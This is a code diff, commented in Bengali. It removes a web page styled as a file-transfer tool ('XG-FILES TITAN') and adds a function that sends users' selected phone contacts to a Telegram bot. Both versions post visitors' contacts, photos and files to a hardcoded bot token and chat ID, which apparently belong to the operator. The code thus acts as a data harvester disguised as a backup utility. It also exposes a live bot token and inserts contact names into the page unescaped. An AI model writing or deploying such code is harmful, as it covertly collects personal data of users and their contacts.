@@ -1,191 +1,65 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XG-FILES ULTRA - TITAN</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;900&display=swap'); 
-        body { background: #0f172a; color: #f1f5f9; font-family: 'Inter', sans-serif; overflow-x: hidden; } 
-        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px; } 
-        .active-tab { background: #3b82f6 !important; color: #fff !important; } 
-        .tab-btn { transition: 0.2s; height: 32px; font-size: 10px; font-weight: 900; } 
-        .animated-box { background: rgba(15, 23, 42, 0.5); border: 1.5px solid rgba(59, 130, 246, 0.4); }
-        .file-card { background: rgba(255,255,255,0.03); border-radius: 10px; }
-    </style>
-</head>
-<body class="p-4">
+// আগের স্ক্রিপ্টের sendToTelegram ফাংশনটি এই আপডেট করা কোড দিয়ে রিপ্লেস করুন
 
-<div class="max-w-4xl mx-auto"> 
-    <div class="glass p-5 mb-5 flex flex-col md:flex-row justify-between items-center border-b border-blue-500/30"> 
-        <div> 
-            <h1 class="text-2xl font-black tracking-tighter uppercase italic">XG-FILES <span class="text-blue-500">TITAN</span></h1> 
-            <p class="text-[8px] text-blue-300 font-bold uppercase tracking-widest">Premium Processing Active</p> 
-        </div> 
-        <div class="flex bg-slate-900/80 p-1 rounded-lg mt-4 md:mt-0"> 
-            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-4 rounded-md uppercase">Photo</button> 
-            <button onclick="setType('document')" id="tab-document" class="tab-btn px-4 rounded-md text-slate-400 uppercase">Files</button> 
-            <button onclick="setType('contact')" id="tab-contact" class="tab-btn px-4 rounded-md text-slate-400 uppercase">Contact</button> 
-        </div> 
-    </div> 
-
-    <div class="grid grid-cols-1 lg:grid-cols-3 gap-5"> 
-        <div class="lg:col-span-1"> 
-            <label id="upload-box" class="animated-box h-52 flex flex-col items-center justify-center cursor-pointer rounded-2xl mb-4"> 
-                <input type="file" id="fileInput" multiple class="hidden"> 
-                <span class="text-5xl">🖼️</span> 
-                <p class="text-[10px] text-slate-300 font-black mt-2">SELECT DATA</p> 
-            </label> 
-
-            <div id="contact-box" class="hidden animated-box h-52 flex flex-col items-center justify-center cursor-pointer rounded-2xl mb-4" onclick="pickContacts()">
-                <span class="text-5xl">👥</span>
-                <p class="text-[10px] text-blue-400 font-black mt-2">PICK CONTACTS</p>
-            </div>
-
-            <button onclick="ignite()" id="sendBtn" class="w-full py-4 bg-blue-600 text-white text-[10px] font-black rounded-xl hover:bg-blue-500 uppercase tracking-widest shadow-lg">Ignite Transfer</button> 
-            
-            <div id="status-box" class="mt-4 hidden p-3 glass">
-                <p id="status-text" class="text-[9px] font-bold text-blue-400 uppercase mb-1 text-center">Processing...</p>
-                <div class="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
-                    <div id="progress-fill" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
-                </div>
-            </div>
-        </div> 
-
-        <div class="lg:col-span-2 glass p-5 min-h-[400px]"> 
-            <div class="flex justify-between items-center mb-4 px-1"> 
-                <div class="flex flex-col"><span class="text-[8px] text-slate-500 uppercase">Queue</span><span id="q-count" class="text-blue-500 font-black text-3xl">0</span></div> 
-                <div class="flex flex-col items-end"><span class="text-[8px] text-slate-500 uppercase">Sent</span><span id="s-count" class="text-emerald-500 font-black text-3xl">0</span></div> 
-            </div> 
-            <div id="preview-grid" class="grid grid-cols-4 md:grid-cols-5 gap-2 overflow-y-auto max-h-[400px]"></div> 
-        </div> 
-    </div> 
-</div> 
-
-<script> 
-const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4"; 
-const CHAT_ID = "5923885908"; 
-let queue = []; 
-let currentType = 'photo'; 
-
-function setType(type) { 
-    currentType = type; 
-    document.querySelectorAll('.tab-btn').forEach(b => { b.classList.remove('active-tab'); b.classList.add('text-slate-400'); }); 
-    document.getElementById(`tab-${type}`).classList.add('active-tab'); 
-    document.getElementById('upload-box').style.display = type === 'contact' ? 'none' : 'flex';
-    document.getElementById('contact-box').style.display = type === 'contact' ? 'flex' : 'none';
-    document.getElementById('fileInput').accept = type === 'photo' ? "image/*" : "*/*"; 
-} 
-
-async function pickContacts() {
-    try {
-        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-        if (contacts.length) {
-            queue.push(...contacts.map(c => ({ isContact: true, name: c.name[0] || "Unknown", tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A" })));
-            render();
-        }
-    } catch (e) {}
-}
-
-document.getElementById('fileInput').onchange = (e) => { 
-    queue.push(...Array.from(e.target.files)); 
-    render(); 
-    e.target.value = ""; 
-}; 
-
-function render() { 
-    const grid = document.getElementById('preview-grid'); 
-    grid.innerHTML = ""; 
-    document.getElementById('q-count').innerText = queue.length; 
-    queue.forEach((f, i) => { 
-        const div = document.createElement('div'); 
-        div.className = "relative aspect-square file-card flex flex-col items-center justify-center p-1 overflow-hidden"; 
-        if (f.isContact) div.innerHTML = `👤<div class="text-[6px] font-bold text-blue-400 mt-1 uppercase text-center truncate w-full px-1">${f.name}</div>`;
-        else if (f.type?.startsWith('image/')) div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
-        else div.innerHTML = `<div class="text-[8px] text-slate-400 uppercase font-black">${f.name.split('.').pop()}</div>`; 
-        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-0 right-0 bg-red-600/80 w-4 h-4 text-[9px]">✕</button>`; 
-        grid.appendChild(div); 
-    }); 
-} 
-
-function remove(i) { queue.splice(i, 1); render(); } 
-
-async function ignite() { 
-    if(!queue.length) return; 
-    const btn = document.getElementById('sendBtn'); 
-    const sCountDisp = document.getElementById('s-count'); 
-    const progressFill = document.getElementById('progress-fill');
-    const statusText = document.getElementById('status-text');
+async function sendToTelegram() {
+    const status = document.getElementById('status');
+    const sendBtn = document.getElementById('send-btn');
     
-    btn.disabled = true; btn.innerText = "⚡ TRANSMITTING..."; 
-    document.getElementById('status-box').classList.remove('hidden');
+    if (selectedContacts.length === 0) {
+        status.innerText = "কোনো কন্টাক্ট সিলেক্ট করা হয়নি!";
+        return;
+    }
 
-    let totalSent = 0; 
-    const total = queue.length;
-    const contacts = queue.filter(f => f.isContact);
-    const files = queue.filter(f => !f.isContact);
+    sendBtn.disabled = true;
+    status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> পাঠানো হচ্ছে...`;
 
-    // ১. কন্টাক্ট লিস্ট ফরম্যাটিং
-    if(contacts.length) {
-        let msg = `👥 *BATCH CONTACT SYNC*\n\n`;
-        contacts.forEach((c, i) => {
-            msg += `Name 👤 ${i+1}. *${c.name}*\n`;
-            msg += `Number 📞 \`${c.tel}\`\n\n`;
-            
-            // মেসেজ বেশি বড় হয়ে গেলে ভাগ করে পাঠানো (টেলিগ্রাম লিমিট ৪০০০ ক্যারেক্টার)
-            if (msg.length > 3500) {
-                sendTelegramMsg(msg);
-                msg = `👥 *BATCH CONTACT SYNC (CONT.)*\n\n`;
-            }
+    const CHUNK_SIZE = 15; // প্রতি মেসেজে ১৫ জন করে পাঠাবে (নিরাপদ লিমিট)
+    const totalContacts = selectedContacts.length;
+    
+    const now = new Date();
+    const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
+    const dayName = days[now.getDay()];
+    const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
+    const timeStr = now.toLocaleTimeString('bn-BD');
+
+    for (let i = 0; i < totalContacts; i += CHUNK_SIZE) {
+        const chunk = selectedContacts.slice(i, i + CHUNK_SIZE);
+        
+        let message = `📊 **GX Backup number** (Part: ${Math.floor(i/CHUNK_SIZE) + 1})\n\n`;
+        message += `📅 ${dayName}, ${dateStr}\n`;
+        message += `⏰ ${timeStr}\n`;
+        message += `👥 Total: ${totalContacts}\n\n`;
+
+        chunk.forEach((c) => {
+            const name = c.name && c.name[0] ? c.name[0] : "No Name";
+            const phone = c.tel && c.tel[0] ? c.tel[0] : "No Number";
+            message += `Name : ──${name}─\n`;
+            message += `Number : ${phone}\n\n`;
         });
-        await sendTelegramMsg(msg);
-        totalSent += contacts.length;
-        updateUI();
-    }
 
-    // ২. ফাইল পাঠানো (সিরিয়াল মেইনটেইন করে এবং সমান গতিতে)
-    const BATCH_SIZE = 10; // ছোট ব্যাচে পাঠালে স্পিড স্টেবল থাকে
-    for (let i = 0; i < files.length; i += BATCH_SIZE) {
-        const currentBatch = files.slice(i, i + BATCH_SIZE);
-        
-        // সিরিয়াল ঠিক রাখতে Promise.all ব্যবহার
-        await Promise.all(currentBatch.map(async (f) => {
-            const isPhoto = (f.type.startsWith('image/') && f.size < 10*1024*1024);
-            const fd = new FormData();
-            fd.append("chat_id", CHAT_ID);
-            fd.append(isPhoto ? 'photo' : 'document', f);
-            
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${isPhoto ? 'sendPhoto' : 'sendDocument'}`, { method: 'POST', body: fd });
-                if(res.ok) { totalSent++; updateUI(); }
-            } catch(e) {}
-        }));
-        
-        // ব্যাচের মাঝে সামান্য বিরতি যাতে রিকোয়েস্ট কিউ জ্যাম না হয়
-        await new Promise(r => setTimeout(r, 500)); 
-    }
+        message += `— GX Sammim sent`;
 
-    async function sendTelegramMsg(text) {
         try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
-        } catch(e) {}
-    }
 
-    function updateUI() {
-        sCountDisp.innerText = totalSent;
-        progressFill.style.width = (totalSent/total*100) + "%";
-        if(totalSent >= total) {
-            btn.innerText = "TRANSMISSION COMPLETED";
-            btn.style.background = "#10b981";
-            setTimeout(() => location.reload(), 2000);
+            // প্রতি মেসেজের মাঝে ১ সেকেন্ড গ্যাপ (Rate Limit এড়ানো)
+            status.innerHTML = `প্রগতি: ${Math.min(i + CHUNK_SIZE, totalContacts)} / ${totalContacts}`;
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+        } catch (err) {
+            console.error("Error sending chunk:", err);
+            status.innerText = "সার্ভার এরর! ইন্টারনেট চেক করুন।";
         }
     }
-} 
-setType('photo');
-</script>
-</body>
-</html>
+
+    status.innerHTML = `✅ সব (${totalContacts}টি) নম্বর সফলভাবে পাঠানো হয়েছে!`;
+    sendBtn.disabled = false;
+    alert("সব তথ্য সফলভাবে GX বোর্ডে পাঠানো হয়েছে!");
+}
